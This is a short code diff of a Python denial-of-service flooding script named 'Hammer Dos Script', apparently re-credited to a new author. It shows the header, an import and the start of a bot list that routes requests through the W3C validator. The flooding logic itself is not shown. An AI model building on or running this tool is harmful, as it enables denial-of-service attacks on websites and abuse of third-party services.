@@ -14,7 +14,8 @@
 #///////////////////////////////////////////////////////////////////////////////
 # Script ini recode dari 
 # python 3.3.2+ Hammer Dos Script v.1
-# by Can Yalçın
+# by Can P4T4H-H4T1
+
 
 
 from queue import Queue
@@ -34,7 +35,9 @@ def user_agent():
 	return(uagent)
 
 
+
 def my_bots():
+	
 	global bots
 	bots=[]
 	bots.append("http://validator.w3.org/check?uri=")
